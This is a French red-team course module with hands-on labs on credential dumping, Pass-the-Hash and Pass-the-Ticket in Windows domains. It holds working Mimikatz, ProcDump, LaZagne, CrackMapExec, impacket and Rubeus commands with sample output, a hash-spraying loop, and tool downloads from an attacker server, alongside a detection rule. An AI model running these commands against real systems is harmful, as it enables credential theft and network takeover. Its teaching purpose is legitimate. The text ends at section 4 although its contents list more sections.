# Module 8 — Élévation de Privilèges & Lateral Movement

---

**Formation Red Team — SDV M2 2026**  
**Durée estimée : 1 h (cours) + 2 h (TP)**

---

## Table des matières

1. [Introduction au Lateral Movement (TA0008)](#1-introduction-au-lateral-movement-ta0008)
2. [Credential Dumping (T1003)](#2-credential-dumping-t1003)
3. [Pass-the-Hash (PtH — T1550.002)](#3-pass-the-hash-pth--t1550002)
4. [Pass-the-Ticket (PtT — T1550.003)](#4-pass-the-ticket-ptt--t1550003)
5. [Overpass-the-Hash (T1550.002)](#5-overpass-the-hash-t1550002)
6. [Mouvement latéral : PsExec, WMI, WinRM, Schtasks](#6-mouvement-latéral--psexec-wmi-winrm-schtasks)
7. [DCSync (T1003.006)](#7-dcsync-t1003006)
8. [Kerberoasting (T1558.003)](#8-kerberoasting-t1558003)
9. [AS-REP Roasting (T1558.004)](#9-as-rep-roasting-t1558004)
10. [TP Synthèse : De Local Admin à Domain Admin](#10-tp-synthèse--de-local-admin--domain-admin)
11. [Annexes](#11-annexes)

---

## 1. Introduction au Lateral Movement (TA0008)

### 1.1 Qu'est-ce que le Lateral Movement ?

Le **Lateral Movement** (déplacement latéral) est la tactique MITRE ATT&CK TA0008 qui regroupe les techniques permettant à un attaquant de se **déplacer d'un système compromis à un autre** sur le réseau. L'objectif est de progresser dans l'infrastructure cible jusqu'à atteindre les actifs critiques.

Contrairement à une idée reçue, le lateral movement n'est pas une technique en soi, mais **une phase entière du kill chain** qui s'appuie sur de nombreuses sous-techniques :

| Phase | Action | Exemple |
|---|---|---|
| Compromission initiale | Accès à un premier poste | Phishing, exploit web |
| Élévation locale | Passer de user → admin local | Exploit kernel, UAC bypass |
| Credential access | Voler des identifiants | Mimikatz, keylogging |
| Mouvement latéral | Utiliser ces identifiants ailleurs | PtH, PsExec, WMI |
| Objectif | Atteindre le DC ou les données | DCSync, dump de base |

### 1.2 Chaîne typique de compromission

La chaîne complète d'une attaque avec lateral movement suit généralement ce schéma :

```
[Poste employé] ──(Phishing)──> [User compromise]
       │
       ├── Élévation locale ──> [Admin local]
       │
       ├── Credential Dump ──> [Hash NTLM + Tickets Kerberos]
       │
       ├── Pass-the-Hash ──> [Serveur Fichier]
       │       │
       │       ├── Credential Dump ──> [Hash Admin domaine]
       │       │
       │       └── Pass-the-Ticket ──> [Contrôleur de domaine]
       │
       └── DCSync ──> [Tous les hashs du domaine]
```

Chaque étape correspond à au moins une technique MITRE ATT&CK :

| Étape | Technique | Code |
|---|---|---|
| Vol d'identifiants en mémoire | OS Credential Dumping | T1003 |
| Utilisation de comptes valides | Valid Accounts | T1078 |
| Passage avec hash | Use Alternate Authentication Material | T1550 |
| Réplication de l'annuaire | DCSync (sub de T1003) | T1003.006 |
| Exécution distante | Remote Services | T1021 |

### 1.3 Techniques clés de TA0008

#### T1003 — OS Credential Dumping

L'extraction des identifiants du système d'exploitation est le **prérequis indispensable** à la plupart des mouvements latéraux. Les sous-techniques incluent :

| Sous-technique | Cible | Outil |
|---|---|---|
| T1003.001 | LSASS Memory (processus) | Mimikatz, ProcDump |
| T1003.002 | Security Account Manager (SAM) | Mimikatz lsadump::sam |
| T1003.003 | NTDS (Contrôleur de domaine) | secretsdump.py |
| T1003.006 | DCSync (via MS-DRSR) | Mimikatz lsadump::dcsync |

#### T1078 — Valid Accounts

L'utilisation de comptes valides est la technique la plus simple et la plus furtive pour le lateral movement. L'attaquant utilise des identifiants légitimes (volés, crackés, ou par défaut) pour s'authentifier.

| Sous-technique | Description |
|---|---|
| T1078.001 | Default Accounts — comptes par défaut (Administrateur, Guest) |
| T1078.002 | Domain Accounts — comptes domaine volés |
| T1078.003 | Local Accounts — comptes locaux |
| T1078.004 | Cloud Accounts — comptes Azure / AWS |

#### T1550 — Use Alternate Authentication Material

Cette technique regroupe l'utilisation de matériel d'authentification alternatif (hash, ticket, certificat) au lieu du mot de passe en clair.

| Sous-technique | Description | Outil |
|---|---|---|
| T1550.001 | Application Access Token — jetons OAuth | AzCopy, Cloud APIs |
| T1550.002 | Pass-the-Hash — hash NTLM | impacket-psexec, crackmapexec |
| T1550.003 | Pass-the-Ticket — ticket Kerberos | Mimikatz, Rubeus |
| T1550.004 | Web Session Cookie — cookie de session | Cookie editor, impacket |

### 1.4 NIS2 et détection des mouvements latéraux

La directive **NIS2 (UE 2022/2555)** impose aux entités essentielles et importantes de détecter les mouvements latéraux. L'article 23 exige une notification des incidents en 24h, ce qui implique une capacité de détection précoce.

**Exigences NIS2 applicables au lateral movement :**

| Article | Exigence | Mapping ATT&CK |
|---|---|---|
| Art. 21(2)(c) | Détection des incidents | TA0008 (Lateral Movement) |
| Art. 21(2)(d) | Continuité des services | Protection des DC contre le DCSync |
| Art. 23(1) | Notification 24h | Alerte précoce sur T1003 |
| Art. 23(3) | Rapport 72h | Qualification des TTPs utilisées |
| Art. 27 | Sanctions | Preuve de couverture ATT&CK |

**Indicateurs de compromission (IoCs) pour le lateral movement :**

```yaml
title: Suspicious Pass-the-Hash Activity
id: 8c9e3e5f-2b1a-4c8d-9f6e-7a3b2c1d0e5f
status: experimental
description: Détecte les connexions avec logon type 9 (NewCredentials) depuis un même compte source
references:
  - https://attack.mitre.org/techniques/T1550/002/
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 9
    LogonProcess: 'Seclogo'
  condition: selection
falsepositives:
  - Utilisation légitime de RunAs / NetOnly
level: high
```

**Mesures de détection NIS2 recommandées :**

1. **Alertes sur EventID 4624 (Logon Type 3 + NTLM) pour les connexions inhabituelles**
2. **Détection des requêtes DRSR (DCSync) via le journal 4662**
3. **Surveillance des tickets Kerberos demandés pour des comptes de service (Kerberoasting)**
4. **Corrélation entre les sessions : un même compte se connectant à +10 machines en 5 minutes**

---

## 2. Credential Dumping (T1003)

### 2.1 Présentation

Le **Credential Dumping** (T1003) est la technique d'extraction des identifiants stockés sur un système. Sous Windows, les principaux réservoirs d'identifiants sont :

| Réservoir | Contenu | Accès |
|---|---|---|
| **LSASS** (Local Security Authority Subsystem Service) | Sessions ouvertes, hashs NTLM, tickets Kerberos | Administrateur local (ou SYSTEM) |
| **SAM** (Security Account Manager) | Hashs des comptes locaux | Administrateur local |
| **NTDS.dit** | Base de comptes du domaine | Admin domaine (ou DCSync) |
| **LSA Secrets** | Mots de passe des services, DPAPI | SYSTEM |
| **Vault** (Credential Manager) | Mots de passe enregistrés | Utilisateur connecté |

### 2.2 Mimikatz

**Mimikatz** est l'outil de référence pour l'extraction d'identifiants sous Windows. Développé par Benjamin Delpy (gentilkiwi), il est capable de :

- Extraire les hashs NTLM de la mémoire LSASS
- Extraire les mots de passe en clair (si configuration adéquate)
- Extraire les tickets Kerberos
- Manipuler les tickets (injection, export)
- Effectuer des attaques DCSync
- Extraire les secrets LSA et DPAPI

#### Installation et prérequis

```powershell
# Téléchargement depuis GitHub
git clone https://github.com/gentilkiwi/mimikatz.git
cd mimikatz

# Mimikatz nécessite des privilèges élevés (Administrateur ou SYSTEM)
# Lancement :
mimikatz.exe

# Droits de débogage (nécessaire pour accéder à LSASS) :
mimikatz # privilege::debug
mimikatz # token::elevate
```

> **Note importante :** Mimikatz est massivement détecté par les antivirus et EDR modernes. En Red Team, il est souvent :
> - Chiffré (packer comme UPX, ConfuserEx)
> - Chargé en mémoire (reflective DLL injection)
> - Exécuté via des techniques de Living-off-the-Land (LOLBins)

#### sekurlsa::logonpasswords

La commande la plus célèbre de Mimikatz : extraire les mots de passe et hashs des sessions en cours dans LSASS.

```mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

**Sortie typique :**

```
Authentication Id : 0 ; 1234567 (00000000:0012d687)
Session           : Interactive from 1
User Name         : jdupont
Domain            : CORP
SID               : S-1-5-21-123456789-1234567890-1234567890-1107

    msv :
     [00000003] Primary
     * Username : jdupont
     * Domain   : CORP
     * NTLM     : aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
     * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
    tspkg :
     * Username : jdupont
     * Domain   : CORP
     * Password : MonSuperMotDePasse123!
    wdigest :
     * Username : jdupont
     * Domain   : CORP
     * Password : MonSuperMotDePasse123!
    kerberos :
     * Username : jdupont
     * Domain   : CORP.LOCAL
     * Password : MonSuperMotDePasse123!
    ssp :
     * Username : jdupont
     * Domain   : CORP.LOCAL
     * Password : MonSuperMotDePasse123!
```

**Détail des sections :**

| Section | Protocole | Contenu |
|---|---|---|
| **msv** | MSV1_0 | Hash NTLM (LM:NTLM) |
| **tspkg** | TS Package | Mot de passe en clair (si TS) |
| **wdigest** | WDigest | Mot de passe en clair (selon config) |
| **kerberos** | Kerberos | Mot de passe en clair (toutes sessions) |
| **ssp** | CredSSP | Mot de passe en clair |

> **Note WDigest :** Depuis Windows 8.1/2012 R2, WDigest est désactivé par défaut. Activation possible via le registre `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential` = 1.

#### lsadump::sam

Extraction des hashs du SAM (Security Account Manager) — comptes locaux uniquement.

```mimikatz
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```

**Sortie :**

```
Domain : CORP-PC01
SysKey : 7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d
Local SID : S-1-5-21-987654321-9876543210-9876543210

SAM Key : 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000001f5 (501)
User : Guest
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000003e8 (1000)
User : jdupont
  Hash NTLM: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

#### lsadump::lsa /patch

Extraction des secrets LSA (mots de passe des services, DPAPI, etc.).

```mimikatz
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::lsa /patch
```

**Contenu typique extrait :**

| Secret | Description |
|---|---|
| `$MACHINE.ACC` | Compte machine (utilisé pour l'authentification du poste dans le domaine) |
| `DRA_Listener` | Secret de réplication (peut être utilisé pour DCSync) |
| `DPAPI_SYSTEM` | Clé de chiffrement DPAPI système |
| `NL$KM` | Clé de déchiffrement des hashs stockés |
| `SC_xxx` | Mots de passe des services Windows (très utile !) |

#### sekurlsa::ekeys

Extraction des clés Kerberos (AES256, AES128, RC4_HMAC) depuis LSASS.

```mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

**Sortie :**

```
User: administrator
    aes256_hmac       : 6b7a8f9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f
    aes128_hmac       : 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
    rc4_hmac_nt       : 31d6cfe0d16ae931b73c59d7e0c089c0
    rc4_hmac_old      : 31d6cfe0d16ae931b73c59d7e0c089c0
    rc4_md4           : 31d6cfe0d16ae931b73c59d7e0c089c0
    rc4_hmac_nt_exp   : 31d6cfe0d16ae931b73c59d7e0c089c0
```

**Utilité des clés extraites :**

| Clé | Algorithme | Usage |
|---|---|---|
| `aes256_hmac` | AES-256 | Authentification Kerberos moderne (plus sécurisé) |
| `aes128_hmac` | AES-128 | Authentification Kerberos alternative |
| `rc4_hmac_nt` | RC4 (NTLM) | Pass-the-Hash, Kerberos RC4 |
| `rc4_hmac_old` | RC4 (ancien) | Compatibilité descendante |

#### kerberos::tickets

Extraction et exportation des tickets Kerberos depuis la session LSASS.

```mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

**Fichiers exportés (dans le dossier de travail) :**

```
[0;12d687]-1-0-40a50000-jdupont@krbtgt-CORP.LOCAL.kirbi
[0;12d687]-2-0-40a50000-jdupont@cifs/FILESERVER.CORP.LOCAL.kirbi
[0;12d687]-3-0-40a50000-jdupont@ldap/DC01.CORP.LOCAL.kirbi
```

**Format des fichiers exportés :**

| Extension | Format | Usage |
|---|---|---|
| `.kirbi` | Format binaire Mimikatz (base64 with header) | Mimikatz |
| `.ccache` | Format MIT Credential Cache | Impacket, outils Linux |

**Conversion kirbi → ccache :**

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
file ticket.ccache
# ticket.ccache: Kerberos Credential Cache (v5)
```

#### vault::cred

Extraction des identifiants stockés dans le **Credential Manager** (Gestionnaire d'identification) de Windows.

```mimikatz
mimikatz # privilege::debug
mimikatz # vault::cred
```

### 2.3 LaZagne

**LaZagne** est un logiciel open source qui permet d'extraire les mots de passe stockés sur un système :
- Navigateurs (Chrome, Firefox, Edge, Opera, etc.)
- Clients mail (Outlook, Thunderbird)
- Bases de données (SQL Server Management Studio, etc.)
- Wi-Fi
- Applications internes (Git, SVN, etc.)

#### Utilisation

```powershell
# Lancement (mode GUI ou CLI)
lazagne.exe all

# Extraire uniquement les mots de passe des navigateurs
lazagne.exe browsers

# Extraire les mots de passe Wi-Fi
lazagne.exe wifi

# Extraire les mots de passe des applications
lazagne.exe mails
lazagne.exe databases
```

**Sortie typique (mode all) :**

```
########### !!  LaZagne v2.4.3  !!  ############
!!! LAZAGNE: The Open Source Password Recovery !!!

[*] Running on: Windows 10.0.19045
[*] User: jdupont

------------------- Chrome passwords -------------------
[+] Password found !!!
URL: https://mail.corp.local
Login: jdupont@corp.local
Password: S3cr3tMail!

------------------- Firefox passwords -------------------
[+] Password found !!!
URL: https://intranet.corp.local
Login: admin_intranet
Password: AdminIntra2026!

------------------- WiFi passwords -------------------
[+] SSID: CORP-WIFI
Password: W1f1_C0rp_2026!
```

**Intérêt pour le lateral movement :** LaZagne permet de récupérer des mots de passe en clair que Mimikatz ne peut pas extraire (WDigest désactivé). Les mots de passe Wi-Fi sont particulièrement intéressants car ils permettent un accès réseau physique.

### 2.4 ProcDump + Mimikatz Offline

Lorsque Mimikatz est bloqué (EDR, AV), on peut utiliser **ProcDump** (outil Microsoft SysInternals légitime) pour dumper le processus LSASS, puis extraire les hashs offline sur une machine d'attaque.

#### Étape 1 : Dump de LSASS avec ProcDump

```powershell
# Dump du processus LSASS
procdump.exe -ma -accepteula lsass.exe lsass.dmp

# Alternative : par PID
tasklist /fi "imagename eq lsass.exe"
procdump.exe -ma 648 lsass.dmp
```

**Paramètres :**

| Option | Signification |
|---|---|
| `-ma` | Mini dump + mémoire complète (nécessaire pour les hashs) |
| `-accepteula` | Accepte la licence sans popup |
| `lsass.exe` | Processus à dumper |
| `lsass.dmp` | Fichier de sortie |

#### Étape 2 : Extraction offline avec Mimikatz

Sur la machine d'attaque (Linux ou Windows) :

```bash
# Sur Linux avec Wine
sudo apt install wine
wine mimikatz.exe
```

```mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::ekeys
```

#### Alternative : pypykatz (Python pur)

```bash
# Pas besoin de Wine, fonctionne nativement sur Linux
pip install pypykatz

# Extraction depuis le dump
pypykatz lsa minidump lsass.dmp

# Extraction en JSON (pour parsing automatique)
pypykatz lsa minidump lsass.dmp -o credentials.json
```

**Avantage :** pypykatz est écrit en Python, ne nécessite pas Wine, et peut être exécuté sur n'importe quelle plateforme.

### 2.5 TP Guidé : Extraire les credentials d'une session Windows

#### Objectif

Depuis un poste Windows compromis avec droits administrateur local, extraire :
1. Les hashs NTLM de la session en cours
2. Les clés Kerberos
3. Les mots de passe des applications (LaZagne)
4. Un dump LSASS pour extraction offline

#### Prérequis

- Machine cible : Windows 10/11 ou Windows Server 2022
- Accès administrateur local
- Répertoire de travail : `C:\Windows\Temp\redteam\`

#### Étape 1 : Transfert des outils

```powershell
# Sur la machine d'attaque :
python3 -m http.server 8000 --directory /tools/

# Sur la machine cible (Windows) :
mkdir C:\Windows\Temp\redteam
cd C:\Windows\Temp\redteam

Invoke-WebRequest -Uri "http://10.0.0.10:8000/mimikatz.exe" -OutFile "mimikatz.exe"
Invoke-WebRequest -Uri "http://10.0.0.10:8000/lazagne.exe" -OutFile "lazagne.exe"
Invoke-WebRequest -Uri "http://10.0.0.10:8000/procdump.exe" -OutFile "procdump.exe"
```

#### Étape 2 : Extraction avec Mimikatz

```powershell
.\mimikatz.exe

mimikatz # privilege::debug
# Sortie : "Privilège '20' OK"

mimikatz # token::elevate
# Sortie : "Token d'élévation réussi"

mimikatz # sekurlsa::logonpasswords
```

**Questions :**
1. Combien de sessions sont actives dans LSASS ?
2. Y a-t-il des mots de passe en clair disponibles ?
3. Quels protocoles (msv, tspkg, wdigest, kerberos) montrent les hashs ?

#### Étape 3 : Extraction des clés Kerberos

```mimikatz
mimikatz # sekurlsa::ekeys
```

#### Étape 4 : Dump LSASS avec ProcDump

```powershell
cd C:\Windows\Temp\redteam
.\procdump.exe -ma -accepteula lsass.exe lsass.dmp
dir lsass.dmp
# Le fichier doit faire plusieurs centaines de Mo
```

#### Étape 5 : Extraction offline (sur machine d'attaque Linux)

```bash
pip install pypykatz
pypykatz lsa minidump lsass.dmp
```

#### Étape 6 : Extraction avec LaZagne

```powershell
.\lazagne.exe browsers
.\lazagne.exe all -oN results_lazagne.txt
type results_lazagne.txt
```

#### Étape 7 : Synthèse des credentials extraits

```bash
=== CREDENTIALS EXTRAITS ===
Date: 02/06/2026
Machine: CORP-PC01 (10.0.1.15)
Utilisateur: CORP\jdupont

--- Hashs NTLM ---
jdupont:31d6cfe0d16ae931b73c59d7e0c089c0
administrateur:8846f7eaee8fb117ad06bdd830b7586c

--- Clés Kerberos ---
administrateur (AES256): 6b7a8f9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f
administrateur (RC4): 8846f7eaee8fb117ad06bdd830b7586c

--- Mots de passe en clair ---
jdupont (webmail): S3cr3tMail!
jdupont (WiFi): W1f1_C0rp_2026!
```

---

## 3. Pass-the-Hash (PtH — T1550.002)

### 3.1 Principe

Le **Pass-the-Hash (PtH)** est une technique qui permet de s'authentifier sur un système distant en utilisant le **hash NTLM** d'un mot de passe, sans jamais connaître le mot de passe en clair.

**Fonctionnement :**

```
┌─────────────────────┐                     ┌─────────────────────┐
│  Machine attaquante │                     │  Machine cible      │
│                     │                     │                     │
│  Hash NTLM connu    │  ──── NTLM Auth ──> │  Vérification du   │
│  (ex: 31d6cfe0...)  │                     │  hash dans SAM/AD  │
│                     │  <─── Accès ───────  │                     │
└─────────────────────┘                     └─────────────────────┘
```

**Pourquoi ça marche ?**

Le protocole d'authentification NTLM (et LM) n'utilise jamais le mot de passe en clair. Il utilise son hash :

1. Le client envoie une demande d'authentification
2. Le serveur répond avec un **challenge** (nombre aléatoire)
3. Le client calcule : `response = HMAC(NT_hash, challenge)`
4. Le serveur vérifie : `response == HMAC(stored_hash, challenge)`

L'attaquant n'a pas besoin du mot de passe, seulement du hash.

### 3.2 Outils pour le Pass-the-Hash

#### crackmapexec (CrackMapExec)

Outil polyvalent pour tester des credentials sur un réseau Windows.

```bash
# Installation
pip install crackmapexec

# Vérifier si un hash NTLM fonctionne en SMB sur une cible
crackmapexec smb 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c

# Avec un hash complet (LM:NTLM)
crackmapexec smb 10.0.1.50 -u jdupont -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Test sur plusieurs machines
crackmapexec smb 10.0.1.50-55 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c

# Exécution de commande distante
crackmapexec smb 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x whoami

# Liste des partages SMB accessibles
crackmapexec smb 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --shares

# Module SAM (dump SAM distant)
crackmapexec smb 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c -M sam

# Module lsassy (dump LSASS distant)
crackmapexec smb 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c -M lsassy
```

**Sortie typique :**

```
SMB         10.0.1.50      445    FILESERVER      [*] Windows 10.0 Build 20348 x64 (name:FILESERVER) (domain:corp.local)
SMB         10.0.1.50      445    FILESERVER      [+] corp.local\Administrator:8846f7eaee8fb117ad06bdd830b7586c (Pwn3d!)
```

Le `(Pwn3d!)` indique que l'utilisateur a les droits administrateur et que l'exécution de commande distante est possible.

#### impacket-psexec

```bash
# Installation impacket
pip install impacket

# Connexion avec hash NTLM
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/jdupont@10.0.1.50

# Avec administrateur
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50

# Exécution d'une commande non interactive
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50 whoami
```

**Paramètres importants :**

| Option | Description |
|---|---|
| `-hashes LMHASH:NTHASH` | Hash NTLM (LM peut être vide avec `:` ou `aad3b4...`) |
| `DOMAIN/user@IP` | Nom de domaine + utilisateur + cible |
| `-codec` | Encodage (ex: `-codec utf-8`) |

#### xfreerdp /pth

```bash
# Connexion RDP avec PtH (nécessite Restricted Admin Mode activé)
xfreerdp /v:10.0.1.50 /u:Administrator /pth:8846f7eaee8fb117ad06bdd830b7586c /cert:ignore
```

**Prérequis : Restricted Admin Mode**

```powershell
# Activer le Restricted Admin Mode (côté cible, en admin)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# Vérifier si le RDM est activé
reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin
```

#### wmiexec.py (impacket)

```bash
# Connexion WMI avec hash NTLM
impacket-wmiexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50
```

**Différence entre wmiexec et psexec :**

| Critère | psexec.py | wmiexec.py |
|---|---|---|
| Mécanisme | Service SVC | WMI (Win32_Process) |
| Événements Windows | 4697 (création service) | 4688 (création process) |
| Binaire uploadé | Oui (service exe) | Non (inline WMI) |
| Discrétion | Moins discret | Plus discret |
| Dépendance | Admin$ accessible | RPC/WMI accessible |

### 3.3 Limitations du Pass-the-Hash

#### WinRM / PowerShell Remoting

Par défaut, **WinRM (5985/5986) ne supporte pas l'authentification NTLM avec un hash**. Il nécessite un mot de passe en clair ou un ticket Kerberos.

```bash
# Tentative de connexion WinRM avec hash (échec)
evil-winrm -i 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
# Erreur : WinRM ne supporte pas le PtH par défaut
```

**Contournements :**
1. **Overpass-the-Hash** (section 5) : convertir le hash en ticket Kerberos
2. **SMB** : utiliser SMB exec à la place

#### SMB selon la configuration

| Configuration | Impact sur PtH SMB |
|---|---|
| Windows Defender Firewall | Bloque SMB (445) si désactivé |
| SMB Signing requis | Peut bloquer certaines attaques de relais, mais pas le PtH direct |
| LSA Protection | Empêche le dump de LSASS, mais pas l'utilisation des hashs |
| Credential Guard | Protège les tickets, le PtH reste possible avec les bons hashs |

### 3.4 TP Guidé : Se connecter à une machine distante avec PtH

#### Objectif

Depuis Kali Linux, se connecter à une machine Windows distante via 3 méthodes : CrackMapExec, impacket-psexec, impacket-wmiexec.

#### Prérequis

- Machine cible : Windows Server 2022 (`FILESERVER`) — 10.0.1.50
- Compte : `Administrator` avec hash NTLM `8846f7eaee8fb117ad06bdd830b7586c`
- Machine attaquante : Kali Linux

#### Étape 1 : Test de connexion

```bash
crackmapexec smb 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
# Sortie attendue :
# SMB         10.0.1.50       445    FILESERVER      [+] corp.local\Administrator:8846f7eaee8fb117ad06bdd830b7586c (Pwn3d!)
```

**Questions :**
1. Quelle est la signification de `(Pwn3d!)` ?
2. Quels sont les partages SMB accessibles ?
3. Le hash fonctionne-t-il sur d'autres machines ?

#### Étape 2 : Shell interactif avec impacket-psexec

```bash
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50
```

```cmd
C:\Windows\system32> whoami
# nt authority\system

C:\Windows\system32> hostname
# FILESERVER

C:\Windows\system32> ipconfig
C:\Windows\system32> net localgroup administrators
```

#### Étape 3 : Shell discret avec impacket-wmiexec

```bash
impacket-wmiexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50
```

**Comparer les logs Windows générés :**

| Méthode | EventID | Log |
|---|---|---|
| **psexec.py** | 4697 | Création de service |
| **psexec.py** | 4624 | Session SMB |
| **wmiexec.py** | 4688 | Création de processus (cmd.exe) |
| **wmiexec.py** | 4624 | Session réseau (type 3) |

#### Étape 4 : Tester les limitations

```bash
# Tentative de connexion WinRM (échec attendu)
evil-winrm -i 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c

# Vérifier si RDP Restricted Admin est actif
crackmapexec smb 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c -M rdp
```

#### Étape 5 : Automatisation

```bash
# Exécuter une commande sur plusieurs machines
crackmapexec smb 10.0.1.50-55 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x whoami

# Tester tous les hashs contre toutes les machines (spray)
for hash in $(cat hashes.txt); do
    crackmapexec smb 10.0.1.50-55 -u Administrator -H "$hash"
done

# Dump des hashs SAM de la cible
crackmapexec smb 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c -M sam
```

---

## 4. Pass-the-Ticket (PtT — T1550.003)

### 4.1 Principe

Le **Pass-the-Ticket (PtT)** consiste à utiliser un ticket Kerberos (TGT ou TGS) pour s'authentifier sur des services distants sans connaître le mot de passe.

**Rappel du fonctionnement de Kerberos :**

```
┌──────────────┐    1. AS-REQ      ┌────────────────┐
│   Client     │ ────────────────>  │   KDC (DC)     │
│  (utilisateur)│                   │  (KRBTGT)      │
│              │ <────────────────  │                │
│              │   2. AS-REP (TGT)  │                │
│              │                   │                │
│              │    3. TGS-REQ     │                │
│              │ ────────────────>  │                │
│              │ <────────────────  │                │
│              │  4. TGS-REP (TGS) │                │
│              │                   │                │
│              │   5. AP-REQ (TGS) │                │
│              │ ────────────────>  │   Service      │
│              │ <────────────────  │                │
│              │   6. AP-REP       │                │
└──────────────┘                   └────────────────┘
```

**Étapes :**
1. **AS-REQ** : Le client demande un TGT au KDC avec son hash NTLM
2. **AS-REP** : Le KDC répond avec un TGT (chiffré avec la clé KRBTGT)
3. **TGS-REQ** : Le client demande un TGS pour un service spécifique
4. **TGS-REP** : Le KDC répond avec un TGS (chiffré avec la clé du service)
5. **AP-REQ** : Le client présente le TGS au service pour s'authentifier

**En PtT, l'attaquant saute les étapes 1-2 (ou 1-4) et injecte directement un ticket volé.**

### 4.2 Mimikatz : kerberos::ptt

#### Export d'un ticket existant

```mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

**Fichiers créés :** (exemple)
```
[0;12d687]-0-0-40a50000-jdupont@krbtgt-CORP.LOCAL.kirbi
```

#### Injection d'un ticket exporté

```mimikatz
mimikatz # kerberos::purge
mimikatz # kerberos::ptt [0;12d687]-0-0-40a50000-jdupont@krbtgt-CORP.LOCAL.kirbi
mimikatz # kerberos::list
```

**Test après injection :**
```cmd
klist
dir \\DC01\C$
```

### 4.3 Rubeus : ptt

**Rubeus** est un outil C# pour la manipulation Kerberos.

```powershell
# Injection d'un ticket (format .kirbi)
Rubeus.exe ptt /ticket:ticket.kirbi

# Injection depuis une base64
Rubeus.exe ptt /ticket:doIE6jCCBO6gAwIBBaEDAgEWoo...

# Purge + injection
Rubeus.exe ptt /ticket:ticket.kirbi /purge

# Lister les tickets dans le cache
Rubeus.exe triage

# Exporter tous les tickets
Rubeus.exe dump
```

### 4.4 Conversion de tickets

| Format | Description | Utilisation |
|---|---|---|
| **.kirbi** | Format binaire Mimikatz (base64+header) | Mimikatz, Rubeus |
| **.ccache** | MIT Credential Cache | impacket, outils Linux |
| **Base64** | Ticket encodé en base64 (format Rubeus) | Transfert HTTP |

**kirbi → ccache :**

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
```

**Utilisation du ticket ccache sur Linux :**

```bash
export KRB5CCNAME=/path/to/ticket.ccache
klist
impacket-smbexec -k -no-pass corp.local/Administrator@DC01.corp.local
```

### 4.5 TP Guidé : Injecter un ticket Kerberos

#### Objectif

1. Exporter le TGT de la session en cours
2. Purger les tickets
3. Injecter le TGT exporté
4. Vérifier l'accès au contrôleur de domaine
5. Convertir le ticket pour utilisation depuis Linux

#### Étape 1 : Export du TGT

```powershell
cd C:\Windows\Temp\redteam
.\mimikatz.exe

mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

#### Étape 2 : Purge et injection

```powershell
mimikatz # kerberos::purge
klist
# Sortie : Aucun ticket Kerberos en cache

mimikatz # kerberos::ptt [0;12d687]-0-0-40a50000-jdupont@krbtgt-CORP.LOCAL.kirbi
mimikatz # kerberos::list
mimikatz # exit
```

#### Étape 3 : Vérification

```cmd
klist
dir \\DC01\SYSVOL\corp.local
dir \\FILESERVER\C$
```

**Questions :**
1. Pourquoi le TGT permet d'accéder à plusieurs services ?
2. Quelle est la durée de validité d'un TGT par défaut ?
3. Que se passe-t-il si on injecte un TGT expiré ?

#### Étape 4 : Export du ticket en ccache pour Linux

```bash
scp user@windows-target:C:\Temp\tickets\*.kirbi .
impacket-ticketConverter *.kirbi ticket.ccache

export KRB5CCNAME=/path/to/ticket.ccache
impacket-smbexec -k -no-pass corp.local/Administrator@FILESERVER.corp.local
```

---

